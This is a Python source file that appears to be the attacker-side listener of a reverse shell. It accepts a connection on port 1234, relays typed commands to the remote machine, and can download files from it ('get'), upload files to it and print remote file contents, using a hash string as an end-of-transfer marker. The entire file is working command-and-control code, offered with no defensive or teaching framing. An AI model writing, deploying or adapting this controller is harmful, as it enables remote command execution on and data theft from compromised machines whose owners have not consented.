import socket

def transfer(c, cmd):
    c.send(cmd.encode())
    destination = input("Enter the destination location: ")
    f = open(destination, "wb")
    while True:
        bits = c.recv(1024)
        # DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042 is the hash of the string "this is the end of file"
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            bits = bits[0:-64]
            f.write(bits)
            break
        f.write(bits)
    print("[+] Transfer Complete")
    f.close()

def upload(c, cmd):
    c.send(cmd.encode())
    filename = cmd.split("*")[1]
    f = open(filename,'rb')
    while True:
        bits = f.read(1024)
        c.send(bits)
        if bits == b'':
            c.send('DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042'.encode())
            break
    f.close()
    print("[+] Transfer Complete")

def cat(c, cmd):
    c.send(cmd.encode())
    print("\n-----------------" + cmd.split("*")[1] + "-----------------\n")
    while True:
        bits = c.recv(1024)
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            temp = bits[0:-64]
            bits = temp
            print(bits.decode())
            break
        print(bits.decode())
    print("\n-----------------EOF-----------------\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 1234
s.bind(('', port))
s.listen(1)
c,addr = s.accept()
shell = c.recv(1024).decode() + ">"
while True:
    cmd = input(shell)
    if 'get' in cmd:
        transfer(c, cmd)
        continue
    elif 'upload' in cmd:
        upload(c,cmd)
        continue
    elif 'exit' in cmd:
        c.send(cmd.encode())
        break
    elif 'cat' in cmd:
        cat(c, cmd)
        continue
    c.send(cmd.encode())
    shell = c.recv(1024).decode()
    print(c.recv(1024).decode())
